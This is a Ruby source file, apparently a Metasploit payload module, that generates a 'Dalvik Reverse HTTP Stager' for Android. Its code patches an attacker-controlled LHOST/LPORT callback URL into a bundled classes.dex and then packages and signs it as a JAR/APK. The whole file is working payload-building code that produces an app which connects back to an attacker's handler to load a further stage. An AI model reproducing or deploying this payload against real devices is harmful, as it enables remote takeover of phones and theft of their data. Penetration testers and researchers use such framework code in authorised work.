##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/uuid_options'

module Metasploit3

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Dalvik
  include Msf::Payload::UUIDOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Dalvik Reverse HTTP Stager',
      'Description'   => 'Tunnel communication over HTTP',
      'Author'        => 'anwarelmakrahy',
      'License'       => MSF_LICENSE,
      'Platform'      => 'android',
      'Arch'          => ARCH_DALVIK,
      'Handler'       => Msf::Handler::ReverseHttp,
      'Stager'        => {'Payload' => ""}
      ))
  end

  def generate_jar(opts={})
    # Default URL length is 30-256 bytes
    uri_req_len = 30 + rand(256-30)
    # Generate the short default URL if we don't know available space
    if self.available_space.nil?
      uri_req_len = 5
    end

    lurl = "ZZZZhttp://#{datastore["LHOST"]}"
    lurl << ":#{datastore["LPORT"]}" if datastore["LPORT"]
    lurl << "/"
    lurl << generate_uri_uuid_mode(:init_java, uri_req_len)

    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
    string_sub(classes, 'ZZZZ' + ' ' * 512, lurl)
    apply_options(classes)

    jar = Rex::Zip::Jar.new
    jar.add_file("classes.dex", fix_dex_header(classes))
    files = [
      [ "AndroidManifest.xml" ],
      [ "resources.arsc" ]
    ]
    jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
    jar.build_manifest

    cert, key = generate_cert
    jar.sign(key, cert, [cert])

    jar
  end

end
